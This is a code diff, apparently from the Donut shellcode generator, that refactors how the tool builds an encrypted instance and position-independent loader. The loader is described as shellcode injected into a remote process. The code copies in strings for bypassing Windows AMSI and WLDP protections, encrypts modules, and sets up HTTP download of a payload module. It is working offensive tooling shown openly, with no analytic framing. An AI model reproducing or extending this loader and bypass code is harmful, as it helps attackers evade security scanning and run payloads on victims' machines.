-    uint64_t        dll_hash = 0;
-    int             cnt = 0;
+    int             cnt, inst_len;
+    uint64_t        dll_hash;
+    int             err = DONUT_ERROR_SUCCESS;
     
     DPRINT("Entering.");
     
     // Allocate memory for the size of instance based on the type
-    DPRINT("Allocating space for instance");
+    DPRINT("Allocating memory for instance");
     inst_len = sizeof(DONUT_INSTANCE);
     
     // if the module is embedded, add the size of module
@@ -769,27 +844,54 @@ static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
       return DONUT_ERROR_NO_MEMORY;
     }
     
+    // set the length of instance and pointer to it in configuration
+    c->inst        = inst;
+    c->inst_len    = inst->len = inst_len;
+    // set the type of instance we're creating
+    inst->type     = c->inst_type;
+    // indicate if we should call RtlExitUserProcess to terminate host process
+    inst->exit_opt = c->exit_opt;
+    // set the Original Entry Point
+    inst->oep      = c->oep;
+    // set the entropy level
+    inst->entropy  = c->entropy;
+    // set the bypass level
+    inst->bypass   = c->bypass;
+    // set the module length
+    inst->mod_len  = c->mod_len;
+
+    // encryption enabled?
     if(c->entropy == DONUT_ENTROPY_DEFAULT) {
       DPRINT("Generating random key for instance");
-      if(!CreateRandom(&inst_key, sizeof(DONUT_CRYPT))) {
-        return DONUT_ERROR_RANDOM;
+      if(!gen_random(&inst_key, sizeof(DONUT_CRYPT))) {
+        DPRINT("gen_random() failed");
+        err = DONUT_ERROR_RANDOM;
+        goto cleanup;
       }
+      // copy local key to configuration
       memcpy(&inst->key, &inst_key, sizeof(DONUT_CRYPT));
       
       DPRINT("Generating random key for module");
-      if(!CreateRandom(&mod_key, sizeof(DONUT_CRYPT))) {
-        return DONUT_ERROR_RANDOM;
+      if(!gen_random(&mod_key, sizeof(DONUT_CRYPT))) {
+        DPRINT("gen_random() failed");
+        err = DONUT_ERROR_RANDOM;
+        goto cleanup;
       }
+      // copy local key to configuration
       memcpy(&inst->mod_key, &mod_key, sizeof(DONUT_CRYPT));
       
       DPRINT("Generating random string to verify decryption");
-      if(!GenRandomString(inst->sig, DONUT_SIG_LEN)) {
-        return DONUT_ERROR_RANDOM;
+      if(!gen_random_string(inst->sig, DONUT_SIG_LEN)) {
+        DPRINT("gen_random() failed");
+        err = DONUT_ERROR_RANDOM;
+        goto cleanup;
       }
      
       DPRINT("Generating random IV for Maru hash");
-      if(!CreateRandom(&inst->iv, MARU_IV_LEN)) {
-        return DONUT_ERROR_RANDOM;
+      if(!gen_random(&inst->iv, MARU_IV_LEN)) {
+        DPRINT("gen_random() failed");
+        err = DONUT_ERROR_RANDOM;
+        goto cleanup;
       }
     }
 
@@ -808,10 +910,11 @@ static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
         api_imports[cnt].name,
         inst->api.hash[cnt]);
     }
-    // save how many API to resolve
+    
+    DPRINT("Setting number of API to %" PRIi32, cnt);
     inst->api_cnt = cnt;
     
-    //  Each DLL required by the loader API is separated by semi-colon
+    DPRINT("Setting DLL names to %s", DLL_NAMES);
     strcpy(inst->dll_names, DLL_NAMES);
         
     // if module is .NET assembly
@@ -852,92 +955,92 @@ static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
       }
     }
 
-    // required to disable AMSI
-    strcpy(inst->clr,            "clr");
-    strcpy(inst->amsi,           "amsi");
-    strcpy(inst->amsiInit,       "AmsiInitialize");
-    strcpy(inst->amsiScanBuf,    "AmsiScanBuffer");
-    strcpy(inst->amsiScanStr,    "AmsiScanString");
+    // if bypassing enabled, copy these strings over
+    if(c->bypass != DONUT_BYPASS_NONE) {
+      DPRINT("Copying strings required to bypass AMSI");
+      
+      strcpy(inst->clr,         "clr");
+      strcpy(inst->amsi,        "amsi");
+      strcpy(inst->amsiInit,    "AmsiInitialize");
+      strcpy(inst->amsiScanBuf, "AmsiScanBuffer");
+      strcpy(inst->amsiScanStr, "AmsiScanString");
+      
+      DPRINT("Copying strings required to bypass WLDP");
+      
+      strcpy(inst->wldp,           "wldp");
+      strcpy(inst->wldpQuery,      "WldpQueryDynamicCodeTrust");
+      strcpy(inst->wldpIsApproved, "WldpIsClassInApprovedList");
+    }
     
-    // stuff for PE loader
-    strcpy(inst->dataname,       ".data");
-    strcpy(inst->kernelbase,     "kernelbase");
-    
-    // ansi and unicode symbols to patch for unmanaged EXE command line
-    strcpy(inst->cmd_syms,       "_acmdln;__argv;__p__acmdln;__p___argv;_wcmdln;__wargv;__p__wcmdln;__p___wargv");
-    
-    // exit-related API to replace with RtlExitUserThread
-    strcpy(inst->exit_api,       "ExitProcess;exit;_exit;_cexit;_c_exit;quick_exit;_Exit");
-
-    // required to disable WLDP
-    strcpy(inst->wldp,           "wldp");
-    strcpy(inst->wldpQuery,      "WldpQueryDynamicCodeTrust");
-    strcpy(inst->wldpIsApproved, "WldpIsClassInApprovedList");
-
-    // set the type of instance we're creating
-    inst->type     = c->inst_type;
-    // indicate if we should call RtlExitUserProcess to terminate host process
-    inst->exit_opt = c->exit_opt;
-    // set the OEP
-    inst->oep      = c->oep;
-    // set the entropy level
-    inst->entropy  = c->entropy;
-    // set the bypass level
-    inst->bypass   = c->bypass;
+    // if module is an unmanaged EXE
+    if(c->mod_type == DONUT_MODULE_EXE) {
+      // does the user specify parameters for the command line?
+      if(c->param[0] != 0) {
+        DPRINT("Copying strings required to replace command line.");
+        
+        strcpy(inst->dataname,   ".data");
+        strcpy(inst->kernelbase, "kernelbase");
+        strcpy(inst->cmd_syms,   "_acmdln;__argv;__p__acmdln;__p___argv;_wcmdln;__wargv;__p__wcmdln;__p___wargv");
+      }
+      // does user want loader to run the entrypoint as a thread?
+      if(c->thread != 0) {
+        DPRINT("Copying strings required to intercept exit-related API");
+        // these exit-related API will be replaced with pointer to RtlExitUserThread
+        strcpy(inst->exit_api, "ExitProcess;exit;_exit;_cexit;_c_exit;quick_exit;_Exit");
+      }
+    }
     
     // if the module will be downloaded
     // set the URL parameter and request verb
     if(inst->type == DONUT_INSTANCE_HTTP) {
-      if(c->entropy != DONUT_ENTROPY_NONE) {
-        // if no module name specified
-        if(c->modname[0] == 0) {
+      // if no module name specified
+      if(c->modname[0] == 0) {
+        // if entropy disabled
+        if(c->entropy == DONUT_ENTROPY_NONE) {
+          // set to "AAAAAAAA"
+          memset(c->modname, 'A', DONUT_MAX_MODNAME);
+        } else {
           // generate a random name for module
           // that will be saved to disk
-          if(!GenRandomString(c->modname, DONUT_MAX_MODNAME)) {
-            return DONUT_ERROR_RANDOM;
+          DPRINT("Generating random name for module");
+          if(!gen_random_string(c->modname, DONUT_MAX_MODNAME)) {
+            DPRINT("gen_random_string() failed");
+            err = DONUT_ERROR_RANDOM;
+            goto cleanup;
           }
-          DPRINT("Generated random name for module : %s", c->modname);
         }
-      } else {
-        // set to "AAAAAAAA"
-        memset(c->modname, 'A', DONUT_MAX_MODNAME);
+        DPRINT("Name for module : %s", c->modname);
       }
-      DPRINT("Setting URL parameters");
       strcpy(inst->server, c->server);
       // append module name
       strcat(inst->server, c->modname);
       // set the request verb
       strcpy(inst->http_req, "GET");
       
-      DPRINT("Payload will attempt download from : %s", inst->server);
-    }
-
-    inst->mod_len = c->mod_len;
-    inst->len     = inst_len;
-    c->inst       = inst;
-    c->inst_len   = inst_len;
-    
-    if(c->inst_type == DONUT_INSTANCE_HTTP && 
-       c->entropy == DONUT_ENTROPY_DEFAULT) 
-    {
-      DPRINT("encrypting module for download");
+      DPRINT("Loader will attempt to download module from : %s", inst->server);
       
-      c->mod->mac = maru(inst->sig, inst->iv);
-      
-      donut_encrypt(
-        mod_key.mk, 
-        mod_key.ctr, 
-        c->mod, 
-        c->mod_len);
-    }
+      // encrypt module?
+      if(c->entropy == DONUT_ENTROPY_DEFAULT) {
+        DPRINT("Encrypting module");
+        
+        c->mod->mac = maru(inst->sig, inst->iv);
+        
+        donut_encrypt(
+          mod_key.mk, 
+          mod_key.ctr, 
+          c->mod, 
+          c->mod_len);
+      }
+    } else 
     // if embedded, copy module to instance
     if(inst->type == DONUT_INSTANCE_EMBED) {
       DPRINT("Copying module data to instance");
       memcpy(&c->inst->module.x, c->mod, c->mod_len);
     }
     
+    // encrypt instance?
     if(c->entropy == DONUT_ENTROPY_DEFAULT) {
-      DPRINT("encrypting instance");
+      DPRINT("Encrypting instance");
       
       inst->mac = maru(inst->sig, inst->iv);
       
@@ -949,292 +1052,70 @@ static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
         inst_data, 
         c->inst_len - offsetof(DONUT_INSTANCE, api_cnt));
     }
-    DPRINT("Leaving.");
-    
-    return DONUT_ERROR_SUCCESS;
+cleanup:
+    // error? release memory for everything
+    if(err != DONUT_ERROR_SUCCESS) {
+      DPRINT("Releasing memory for module due to errors.");
+      free(c->mod);
+    }
+    DPRINT("Leaving with error :  %" PRId32, err);
+    return err;
 }
-  
-// given a configuration, create a position-independent code that will run from anywhere in memory
-EXPORT_FUNC 
-int DonutCreate(PDONUT_CONFIG c) {
-    uint8_t   *pl;
-    uint32_t  t;
-    int       url_len, err = DONUT_ERROR_SUCCESS;
-    FILE      *fd;
-    file_info fi;
+
+/**
+ * Function: save_file
+ * ----------------------------
+ *   Creates a file and writes the contents of input buffer to it.
+ *
+ *   INPUT  : path = where to create file.
+ *            data = what to write to file.
+ *            len  = length of data.
+ *
+ *   OUTPUT : Donut error code.
+ */
+static int save_file(const char *path, void *data, int len) {
+    FILE *out;
+    int  err = DONUT_ERROR_SUCCESS;
     
     DPRINT("Entering.");
-    
-    DPRINT("Validating configuration and path of file PDONUT_CONFIG: %p", c);
-    
-    if(c == NULL || c->input[0] == 0) {
-      return DONUT_ERROR_INVALID_PARAMETER;
-    }
-    
-    c->mod      = NULL;
-    c->mod_len  = 0;
-    
-    c->inst     = NULL;
-    c->inst_len = 0;
-    
-    c->pic      = NULL;
-    c->pic_len  = 0;
-    
-    // instance not specified?
-    DPRINT("Validating instance type %" PRIx32 "", c->inst_type);
-    
-    if(c->inst_type != DONUT_INSTANCE_EMBED &&
-       c->inst_type != DONUT_INSTANCE_HTTP) {
-         
-      return DONUT_ERROR_INVALID_PARAMETER;
-    }
-    
-    DPRINT("Validating format");
-    if(c->format < DONUT_FORMAT_BINARY || c->format > DONUT_FORMAT_HEX){
-      return DONUT_ERROR_INVALID_FORMAT;
-    }
-    
-    DPRINT("Validating compression");
-    #ifdef WINDOWS
-      if(c->compress != DONUT_COMPRESS_NONE        &&
-         c->compress != DONUT_COMPRESS_APLIB       &&
-         c->compress != DONUT_COMPRESS_LZNT1       &&
-         c->compress != DONUT_COMPRESS_XPRESS      &&
-         c->compress != DONUT_COMPRESS_XPRESS_HUFF)
-      {
-        return DONUT_ERROR_INVALID_ENGINE;
-      }
-    #else
-      if(c->compress != DONUT_COMPRESS_NONE        &&
-         c->compress != DONUT_COMPRESS_APLIB)
-      {
-        return DONUT_ERROR_INVALID_ENGINE;
-      }
-    #endif
-  
-    DPRINT("Validating entropy level");
-    if(c->entropy != DONUT_ENTROPY_NONE   &&
-       c->entropy != DONUT_ENTROPY_RANDOM &&
-       c->entropy != DONUT_ENTROPY_DEFAULT)
-    {
-      return DONUT_ERROR_INVALID_ENTROPY;
-    }
-    
-    if(c->inst_type == DONUT_INSTANCE_HTTP) {
-      DPRINT("Validating URL");
+    out = fopen(path, "wb");
       
-      // no URL? exit
-      if(c->server[0] == 0) {
-        return DONUT_ERROR_INVALID_PARAMETER;
-      }
-      // doesn't begin with one of the following? exit
-      if((strnicmp(c->server, "http://",  7) != 0) &&
-         (strnicmp(c->server, "https://", 8) != 0)) {
-           
-        return DONUT_ERROR_INVALID_URL;
-      }
-      // invalid length?
-      if(strlen(c->server) <= 8) {
-        return DONUT_ERROR_URL_LENGTH;
-      }
-      // ensure URL parameter and module name don't exceed DONUT_MAX_NAME
-      url_len = strlen(c->server);
-      
-      // if the end of string doesn't have a forward slash
-      // add one more to account for it
-      if(c->server[url_len - 1] != '/') {
-        strcat(c->server, "/");
-        url_len++;
-      }
-      
-      if((url_len + DONUT_MAX_MODNAME) >= DONUT_MAX_NAME) {
-        return DONUT_ERROR_URL_LENGTH;
-      }
-    }
+    if(out != NULL) {
+      DPRINT("Writing %d bytes of %p to %s", len, data, path);
+      fwrite(data, 1, len, out);
+      fclose(out);
+    } else err = DONUT_ERROR_FILE_ACCESS;
     
-    DPRINT("Validating architecture");
-    
-    if(c->arch != DONUT_ARCH_X86 &&
-       c->arch != DONUT_ARCH_X64 &&
-       c->arch != DONUT_ARCH_X84 &&
-       c->arch != DONUT_ARCH_ANY)
-    {
-      return DONUT_ERROR_INVALID_ARCH;
-    }
-    
-    DPRINT("Validating AMSI/WDLP bypass option");
-    
-    if(c->bypass != DONUT_BYPASS_NONE     &&
-       c->bypass != DONUT_BYPASS_ABORT    &&
-       c->bypass != DONUT_BYPASS_CONTINUE)
-    {
-      return DONUT_ERROR_BYPASS_INVALID;
-    }
-    
-    // get file information
-    err = get_file_info(c, &fi);
-    if(err != DONUT_ERROR_SUCCESS) return err;
-    
-    // Set the module type
-    c->mod_type = fi.type;
-    
-    // Unmanaged EXE/DLL?
-    if(c->mod_type == DONUT_MODULE_DLL ||
-       c->mod_type == DONUT_MODULE_EXE)
-    {
-      DPRINT("Validating architecture %i for DLL/EXE %i",
-        c->arch, fi.arch);
-      // Requested shellcode is x86, but file is x64?
-      // Requested shellcode is x64, but file is x86?
-      if((c->arch == DONUT_ARCH_X86  && 
-         fi.arch  == DONUT_ARCH_X64) ||
-         (c->arch == DONUT_ARCH_X64  &&
-         fi.arch  == DONUT_ARCH_X86))
-      {
-        err = DONUT_ERROR_ARCH_MISMATCH;
-        goto cleanup;
-      }
-      // DLL function specified. Does it exist?
-      if(c->mod_type == DONUT_MODULE_DLL && c->method[0] != 0)
-      {
-        DPRINT("Validating DLL function \"%s\" for DLL", c->method);
-        if(!is_dll_export(&fi, c->method)) {
-          err = DONUT_ERROR_DLL_FUNCTION;
-          goto cleanup;
-        }
-      }
-    }    
-    // .NET DLL assembly?
-    if(c->mod_type == DONUT_MODULE_NET_DLL) {
-      // DLL requires class and method
-      if(c->cls[0] == 0 || c->method[0] == 0) {
-        err = DONUT_ERROR_NET_PARAMS;
-        goto cleanup;
-      }
-    }
-    
-    // is this an unmanaged DLL with parameters?
-    if(c->mod_type == DONUT_MODULE_DLL && c->param[0] != 0)
-    {
-      // we need a DLL function
-      if(c->method[0] == 0) {
-        err = DONUT_ERROR_DLL_PARAM;
-        goto cleanup;
-      }
-    }
-    // 1. Create the module
-    DPRINT("Creating module");
-    err = CreateModule(c, &fi);
-    
-    if(err != DONUT_ERROR_SUCCESS) 
-      goto cleanup;
+    DPRINT("Leaving with error :  %" PRId32, err);
+    return err;
+}
 
-    // 2. Create the instance
-    DPRINT("Creating instance");
-    err = CreateInstance(c, &fi);
-    
-    if(err != DONUT_ERROR_SUCCESS)
-      goto cleanup;
+/**
+ * Function: save_loader
+ * ----------------------------
+ *   Saves the loader to output file. Also saves instance for debug builds.
+ *   If the instance type is HTTP, it saves the module to file.
+ *
+ *   INPUT  : Donut configuration.
+ *
+ *   OUTPUT : Donut error code.
+ */
+static int save_loader(PDONUT_CONFIG c) {
+    int   err = DONUT_ERROR_SUCCESS;
+    FILE *fd;
     
     // if DEBUG is defined, save instance to disk
     #ifdef DEBUG
-      DPRINT("Saving instance to file");
-      fd = fopen("instance", "wb");
-      
-      if(fd != NULL) {
-        fwrite(c->inst, 1, c->inst_len, fd);
-        fclose(fd);
-      }
+      DPRINT("Saving instance %p to file. %" PRId32 " bytes.", c->inst, c->inst_len);
+      save_file("instance", c->inst, c->inst_len);
     #endif
-    // 3. If the module will be stored on a remote server
+
+    // If the module will be stored on a remote server
     if(c->inst_type == DONUT_INSTANCE_HTTP) {
-      DPRINT("Saving %s to disk.", c->modname);
-      // save the module to disk using random name
-      fd = fopen(c->modname, "wb");
-      
-      if(fd != NULL) {
-        fwrite(c->mod, 1, c->mod_len, fd);
-        fclose(fd);
-      }
+      DPRINT("Saving %s to file.", c->modname);
+      save_file(c->modname, c->mod, c->mod_len);
     }
-    // 4. calculate size of shellcode + instance combined
-    if(c->arch == DONUT_ARCH_X86) {
-      c->pic_len = sizeof(LOADER_EXE_X86) + c->inst_len + 32;
-    } else 
-    if(c->arch == DONUT_ARCH_X64) {
-      c->pic_len = sizeof(LOADER_EXE_X64) + c->inst_len + 32;
-    } else 
-    if(c->arch == DONUT_ARCH_X84) {
-      c->pic_len = sizeof(LOADER_EXE_X86) + 
-                   sizeof(LOADER_EXE_X64) + c->inst_len + 32;
-    }
-    // 5. allocate memory for shellcode
-    c->pic = malloc(c->pic_len);
-    
-    DPRINT("PIC size : %" PRIi32, c->pic_len);
-    
-    if(c->pic == NULL) {
-      err = DONUT_ERROR_NO_MEMORY;
-      goto cleanup;
-    }
-    
-    DPRINT("Inserting opcodes");
-    // 6. insert shellcode
-    pl = (uint8_t*)c->pic;
-    // call $ + c->inst_len
-    PUT_BYTE(pl,  0xE8);
-    PUT_WORD(pl,  c->inst_len);
-    PUT_BYTES(pl, c->inst, c->inst_len);
-    // pop ecx
-    PUT_BYTE(pl,  0x59);
-    
-    // x86?
-    if(c->arch == DONUT_ARCH_X86) {
-      // pop edx
-      PUT_BYTE(pl, 0x5A);
-      // push ecx
-      PUT_BYTE(pl, 0x51);
-      // push edx
-      PUT_BYTE(pl, 0x52);
-      
-      DPRINT("Copying %" PRIi64 " bytes of x86 shellcode", 
-        (uint64_t)sizeof(LOADER_EXE_X86));
-        
-      PUT_BYTES(pl, LOADER_EXE_X86, sizeof(LOADER_EXE_X86));
-    } else 
-    // AMD64?
-    if(c->arch == DONUT_ARCH_X64) {
-      
-      DPRINT("Copying %" PRIi64 " bytes of amd64 shellcode", 
-        (uint64_t)sizeof(LOADER_EXE_X64));
-        
-      PUT_BYTES(pl, LOADER_EXE_X64, sizeof(LOADER_EXE_X64));
-    } else 
-    // x86 + AMD64?
-    if(c->arch == DONUT_ARCH_X84) {
-      
-      DPRINT("Copying %" PRIi64 " bytes of x86 + amd64 shellcode",
-        (uint64_t)(sizeof(LOADER_EXE_X86) + sizeof(LOADER_EXE_X64)));
-        
-      // xor eax, eax
-      PUT_BYTE(pl, 0x31);
-      PUT_BYTE(pl, 0xC0);
-      // dec eax
-      PUT_BYTE(pl, 0x48);
-      // js dword x86_code
-      PUT_BYTE(pl, 0x0F);
-      PUT_BYTE(pl, 0x88);
-      PUT_WORD(pl,  sizeof(LOADER_EXE_X64));
-      PUT_BYTES(pl, LOADER_EXE_X64, sizeof(LOADER_EXE_X64));
-      // pop edx
-      PUT_BYTE(pl, 0x5A);
-      // push ecx
-      PUT_BYTE(pl, 0x51);
-      // push edx
-      PUT_BYTE(pl, 0x52);
-      PUT_BYTES(pl, LOADER_EXE_X86, sizeof(LOADER_EXE_X86));
-    }
-    
+              
     // no output file specified?
     if(c->output[0] == 0) {
       // set to default name based on format
@@ -1268,13 +1149,13 @@ int DonutCreate(PDONUT_CONFIG c) {
     // save loader to file
     fd = fopen(c->output, "wb");
     if(fd == NULL) {
-      err = DONUT_ERROR_FILE_ACCESS;
-      goto cleanup;
+      DPRINT("Opening %s failed.", c->output);
+      return DONUT_ERROR_FILE_ACCESS;
     }
     
     switch(c->format) {
       case DONUT_FORMAT_BINARY: {
-        DPRINT("Saving loader as raw data");
+        DPRINT("Saving loader as binary");
         fwrite(c->pic, 1, c->pic_len, fd);
         err = DONUT_ERROR_SUCCESS;
         break;
@@ -1307,17 +1188,387 @@ int DonutCreate(PDONUT_CONFIG c) {
         break;
     }
     fclose(fd);
-cleanup:
+    DPRINT("Leaving with error :  %" PRId32, err);
+    return err;
+}
+
+/**
+ * Function: build_loader
+ * ----------------------------
+ *   Builds the shellcode that's injected into remote process.
+ *
+ *   INPUT  : Donut configuration.
+ *
+ *   OUTPUT : Donut error code.
+ */
+static int build_loader(PDONUT_CONFIG c) {
+    uint8_t *pl;
+    uint32_t t;
+    
+    // target is x86?
+    if(c->arch == DONUT_ARCH_X86) {
+      c->pic_len = sizeof(LOADER_EXE_X86) + c->inst_len + 32;
+    } else 
+    // target is amd64?
+    if(c->arch == DONUT_ARCH_X64) {
+      c->pic_len = sizeof(LOADER_EXE_X64) + c->inst_len + 32;
+    } else 
+    // target can be both x86 and amd64?
+    if(c->arch == DONUT_ARCH_X84) {
+      c->pic_len = sizeof(LOADER_EXE_X86) + 
+                   sizeof(LOADER_EXE_X64) + c->inst_len + 32;
+    }
+    // allocate memory for shellcode
+    c->pic = malloc(c->pic_len);
+     
+    if(c->pic == NULL) {
+      DPRINT("Unable to allocate %" PRId32 " bytes of memory for loader.", c->pic_len);
+      return DONUT_ERROR_NO_MEMORY;
+    }
+    
+    DPRINT("Inserting opcodes");
+    
+    // insert shellcode
+    pl = (uint8_t*)c->pic;
+    
+    // call $ + c->inst_len
+    PUT_BYTE(pl,  0xE8);
+    PUT_WORD(pl,  c->inst_len);
+    PUT_BYTES(pl, c->inst, c->inst_len);
+    // pop ecx
+    PUT_BYTE(pl,  0x59);
+    
+    // x86?
+    if(c->arch == DONUT_ARCH_X86) {
+      // pop edx
+      PUT_BYTE(pl, 0x5A);
+      // push ecx
+      PUT_BYTE(pl, 0x51);
+      // push edx
+      PUT_BYTE(pl, 0x52);
+      
+      DPRINT("Copying %" PRIi32 " bytes of x86 shellcode", 
+        (uint32_t)sizeof(LOADER_EXE_X86));
+        
+      PUT_BYTES(pl, LOADER_EXE_X86, sizeof(LOADER_EXE_X86));
+    } else 
+    // AMD64?
+    if(c->arch == DONUT_ARCH_X64) {
+      
+      DPRINT("Copying %" PRIi32 " bytes of amd64 shellcode", 
+        (uint32_t)sizeof(LOADER_EXE_X64));
+        
+      PUT_BYTES(pl, LOADER_EXE_X64, sizeof(LOADER_EXE_X64));
+    } else 
+    // x86 + AMD64?
+    if(c->arch == DONUT_ARCH_X84) {
+      
+      DPRINT("Copying %" PRIi32 " bytes of x86 + amd64 shellcode",
+        (uint32_t)(sizeof(LOADER_EXE_X86) + sizeof(LOADER_EXE_X64)));
+        
+      // xor eax, eax
+      PUT_BYTE(pl, 0x31);
+      PUT_BYTE(pl, 0xC0);
+      // dec eax
+      PUT_BYTE(pl, 0x48);
+      // js dword x86_code
+      PUT_BYTE(pl, 0x0F);
+      PUT_BYTE(pl, 0x88);
+      PUT_WORD(pl,  sizeof(LOADER_EXE_X64));
+      PUT_BYTES(pl, LOADER_EXE_X64, sizeof(LOADER_EXE_X64));
+      // pop edx
+      PUT_BYTE(pl, 0x5A);
+      // push ecx
+      PUT_BYTE(pl, 0x51);
+      // push edx
+      PUT_BYTE(pl, 0x52);
+      PUT_BYTES(pl, LOADER_EXE_X86, sizeof(LOADER_EXE_X86));
+    }
+    return DONUT_ERROR_SUCCESS;
+}
+
+/**
+ * Function: validate_loader_cfg
+ * ----------------------------
+ *   Validates Donut configuration for loader.
+ *
+ *   INPUT  : Pointer to a Donut configuration.
+ *
+ *   OUTPUT : Donut error code.
+ */
+static int validate_loader_cfg(PDONUT_CONFIG c) {
+    uint32_t url_len;
+    
+    DPRINT("Validating loader configuration.");
+    
+    if(c == NULL || c->input[0] == 0) {
+      DPRINT("No configuration or input file provided.");
+      return DONUT_ERROR_INVALID_PARAMETER;
+    }
+
+    if(c->inst_type != DONUT_INSTANCE_EMBED &&
+       c->inst_type != DONUT_INSTANCE_HTTP) {
+      
+      DPRINT("Instance type %" PRIx32 " is invalid.", c->inst_type);
+      return DONUT_ERROR_INVALID_PARAMETER;
+    }
+    
+    if(c->format < DONUT_FORMAT_BINARY || c->format > DONUT_FORMAT_HEX) {
+      DPRINT("Format type %" PRId32 " is invalid.", c->format);
+      return DONUT_ERROR_INVALID_FORMAT;
+    }
+    
+    #ifdef WINDOWS
+      if(c->compress != DONUT_COMPRESS_NONE        &&
+         c->compress != DONUT_COMPRESS_APLIB       &&
+         c->compress != DONUT_COMPRESS_LZNT1       &&
+         c->compress != DONUT_COMPRESS_XPRESS      &&
+         c->compress != DONUT_COMPRESS_XPRESS_HUFF)
+      {
+        DPRINT("Compression engine %" PRId32 " is invalid.", c->compress);
+        return DONUT_ERROR_INVALID_ENGINE;
+      }
+    #else
+      if(c->compress != DONUT_COMPRESS_NONE        &&
+         c->compress != DONUT_COMPRESS_APLIB)
+      {
+        DPRINT("Compression engine %" PRId32 " is invalid.", c->compress);
+        return DONUT_ERROR_INVALID_ENGINE;
+      }
+    #endif
+  
+    if(c->entropy != DONUT_ENTROPY_NONE   &&
+       c->entropy != DONUT_ENTROPY_RANDOM &&
+       c->entropy != DONUT_ENTROPY_DEFAULT)
+    {
+      DPRINT("Entropy level " PRId32 " is invalid.", c->entropy);
+      return DONUT_ERROR_INVALID_ENTROPY;
+    }
+    
+    if(c->inst_type == DONUT_INSTANCE_HTTP) {
+      // no URL? exit
+      if(c->server[0] == 0) {
+        DPRINT("Error: No HTTP server provided.");
+        return DONUT_ERROR_INVALID_PARAMETER;
+      }
+      // doesn't begin with one of the following? exit
+      if((strnicmp(c->server, "http://",  7) != 0) &&
+         (strnicmp(c->server, "https://", 8) != 0)) {
+        
+        DPRINT("URL is invalid : %s", c->server);
+        return DONUT_ERROR_INVALID_URL;
+      }
+      // invalid length?
+      url_len = (uint32_t)strlen(c->server);
+      
+      if(url_len <= 8) {
+        DPRINT("URL length : %" PRId32 " is invalid.", url_len);
+        return DONUT_ERROR_URL_LENGTH;
+      }
+      // if the end of string doesn't have a forward slash
+      // add one more to account for it
+      if(c->server[url_len - 1] != '/') {
+        c->server[url_len] = '/';
+        url_len++;
+      }
+      
+      if((url_len + DONUT_MAX_MODNAME) >= DONUT_MAX_NAME) {
+        DPRINT("URL length : %" PRId32 " exceeds size of buffer : %"PRId32, 
+          url_len+DONUT_MAX_MODNAME, DONUT_MAX_NAME);
+        return DONUT_ERROR_URL_LENGTH;
+      }
+    }
+    
+    if(c->arch != DONUT_ARCH_X86 &&
+       c->arch != DONUT_ARCH_X64 &&
+       c->arch != DONUT_ARCH_X84 &&
+       c->arch != DONUT_ARCH_ANY)
+    {
+      DPRINT("Target architecture %"PRId32 " is invalid.", c->arch);
+      return DONUT_ERROR_INVALID_ARCH;
+    }
+    
+    if(c->bypass != DONUT_BYPASS_NONE     &&
+       c->bypass != DONUT_BYPASS_ABORT    &&
+       c->bypass != DONUT_BYPASS_CONTINUE)
+    {
+      DPRINT("Option to bypass AMSI/WDLP %"PRId32" is invalid.", c->bypass);
+      return DONUT_ERROR_BYPASS_INVALID;
+    }
+    
+    DPRINT("Loader configuration passed validation.");
+    return DONUT_ERROR_SUCCESS;
+}
+
+/**
+ * Function: is_dll_export
+ * ----------------------------
+ *   Validates if a DLL exports a function. 
+ *
+ *   INPUT  : Name of DLL function to check.
+ *
+ *   OUTPUT : 1 if found, else 0
+ */
+static int is_dll_export(const char *function) {
+    PIMAGE_DATA_DIRECTORY   dir;
+    PIMAGE_EXPORT_DIRECTORY exp;
+    DWORD                   rva, cnt;
+    ULONG64                 ofs;
+    PDWORD                  sym;
+    PCHAR                   str;
+    int                     found = 0;
+
+    DPRINT("Entering.");
+    
+    dir = Dirs(fi.data);
+    if(dir != NULL) {
+      rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+      DPRINT("EAT VA : %lx", rva);
+      if(rva != 0) {
+        ofs = rva2ofs(fi.data, rva);
+        DPRINT("Offset = %" PRIX64 "\n", ofs);
+        if(ofs != -1) {
+          exp = (PIMAGE_EXPORT_DIRECTORY)(fi.data + ofs);
+          cnt = exp->NumberOfNames;
+          DPRINT("Number of exported functions : %lx", cnt);
+          
+          if(cnt != 0) {
+            sym = (PDWORD)(rva2ofs(fi.data, exp->AddressOfNames) + fi.data);
+            // scan array for symbol
+            do {
+              str = (PCHAR)(rva2ofs(fi.data, sym[cnt - 1]) + fi.data);
+              // if match found, exit
+              if(strcmp(str, function) == 0) {
+                DPRINT("Found API");
+                found = 1;
+                break;
+              }
+            } while (--cnt);
+          }
+        }
+      }
+    }
+    DPRINT("Leaving.");
+    return found;
+}
+
+/**
+ * Function: validate_file_cfg
+ * ----------------------------
+ *   Validates configuration for the input file.
+ *
+ *   INPUT  : Pointer to Donut configuration.
+ *
+ *   OUTPUT : Donut error code. 
+ */
+static int validate_file_cfg(PDONUT_CONFIG c) {
+    DPRINT("Validating configuration for input file.");
+    
+    // Unmanaged EXE/DLL?
+    if(fi.type == DONUT_MODULE_DLL ||
+       fi.type == DONUT_MODULE_EXE)
+    {
+      // Requested shellcode is x86, but file is x64?
+      // Requested shellcode is x64, but file is x86?
+      if((c->arch == DONUT_ARCH_X86  && 
+         fi.arch  == DONUT_ARCH_X64) ||
+         (c->arch == DONUT_ARCH_X64  &&
+         fi.arch  == DONUT_ARCH_X86))
+      {
+        DPRINT("Target architecture %"PRId32 " is not compatible with DLL/EXE %"PRId32, c->arch, fi.arch);
+        return DONUT_ERROR_ARCH_MISMATCH;
+      }
+      // DLL function specified. Does it exist?
+      if(fi.type == DONUT_MODULE_DLL && c->method[0] != 0)
+      {
+        if(!is_dll_export(c->method)) {
+          DPRINT("Unable to locate function \"%s\" in DLL", c->method);
+          return DONUT_ERROR_DLL_FUNCTION;
+        }
+      }
+    }    
+    // .NET DLL assembly?
+    if(fi.type == DONUT_MODULE_NET_DLL) {
+      // DLL requires class and method
+      if(c->cls[0] == 0 || c->method[0] == 0) {
+        DPRINT("Input file is a .NET assembly, but no class and method have been specified.");
+        return DONUT_ERROR_NET_PARAMS;
+      }
+    }
+    
+    // is this an unmanaged DLL with parameters?
+    if(fi.type == DONUT_MODULE_DLL && c->param[0] != 0) {
+      // we need a DLL function
+      if(c->method[0] == 0) {
+        DPRINT("Parameters are provided for an unmanaged/native DLL, but no function.");
+        return DONUT_ERROR_DLL_PARAM;
+      }
+    }
